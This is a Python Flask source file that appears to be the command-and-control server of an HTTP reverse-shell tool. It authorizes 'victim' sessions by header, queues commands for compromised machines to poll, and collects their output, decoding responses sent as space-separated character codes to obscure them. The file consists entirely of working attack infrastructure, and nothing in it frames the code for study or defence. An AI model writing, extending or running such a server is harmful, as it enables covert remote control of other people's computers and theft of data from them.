from flask import Flask, request
import core.server as sSrv
import threading
import time
import core.hoaxshell.payloads as payloads

hxshl = Flask(__name__)

class shellData:
    allowedUIDS = []
    hxUIDS = []
    cmds = {}
    responses = {}

class interactive:
    def run(cmd, uid, timeout=30, _async=False):
        cycles = 0
        shellData.cmds[uid] = [cmd]

        if _async:
            threading.Thread(target=interactive._asyncHandler, args=(uid,), daemon=True).start()
            return None

        while len(shellData.responses[uid]) == 0:
            if cycles*0.1 == timeout:
                raise TimeoutError("timed out waiting for victim response")
            else:
                cycles += 1

            time.sleep(0.1)

        data = shellData.responses[uid][0]
        shellData.responses[uid].pop(0)
        
        print("-" * 25)
        print(data)
        print("-" * 25)

        return data
    
    def _asyncHandler(uid): # literally only job is to remove the response once exists
        while len(shellData.responses[uid]) == 0:
            time.sleep(0.1)
            pass
        shellData.responses[uid].pop(0)

# UIDs are always in this format:

# x*8 - y*8 - z*8

# X is the route it goes for initial authorization
# Y is the route it goes for the pool check
# Z is the route it goes for command response, which will usually change

# usually, X and Y will be the same across all payloads

## initial authorization
@hxshl.route("/e030d4f6")
def IEX_init():
    payloadID = sSrv.shellServer.genUID(24)

    print("authorization of ", end="")
    print(request.headers.get("Authorization"))

    if request.headers.get("Authorization") not in shellData.allowedUIDS:
        return "ok"
    
    shellData.cmds[request.headers.get("Authorization")] = ["$UID = \""+payloadID+"\""]
    shellData.responses[request.headers.get("Authorization")] = ()

    print(shellData.hxUIDS)

    return "ok"

## command pool check
@hxshl.route("/9393dc2a")
def IEX_cmdpool():

    uid = request.headers.get("Authorization")

    print(shellData.cmds)

    if len(shellData.cmds[uid]) > 0:
        cmd = shellData.cmds[uid][0]
        shellData.cmds[uid].pop(0)
        return cmd
    
    return "None"

# PS HTTP IEX
## encoded command response
@hxshl.route("/2f810c1e", methods=["POST"])
def IEX_response():
    fullStr = ""
    data = request.get_data().decode('utf-8')

    if request.headers.get("Authorization") in shellData.allowedUIDS:
        if request.headers.get("Authorization") not in shellData.hxUIDS: # new victim
            shellData.hxUIDS.append(request.headers.get("Authorization"))

    # for setting the UID, usually the first command executed will mess up - this will throw away the first resopnse, and receive all others
    # dirty fix, but works
    if type(shellData.responses[request.headers.get("Authorization")]) == tuple:
        shellData.responses[request.headers.get("Authorization")] = []
        return "None"

    if data == "": 
        # if empty, don't try to fix it
        shellData.responses[request.headers.get("Authorization")] = ['']
        return "None"
    else:
        # kinda odd way of doing it, but also smart way of obfuscating the response
        for x in data.split(" "):
            fullStr += chr(int(x))

    shellData.responses[request.headers.get("Authorization")] = [fullStr.strip()]

    return "None"

# CMD cURL
## not encoded command response
@hxshl.route("/dd9e00a7", methods=["POST"])
def CMD_response():

    shellData.responses[request.headers.get("Authorization")] = [request.get_data().decode('utf-8').strip()]

    return "None"

def startServer(ip:str, port=12728):
    #log = logging.getLogger('werkzeug')
    #log.setLevel(logging.ERROR)

    hxshl.run(ip, port=port)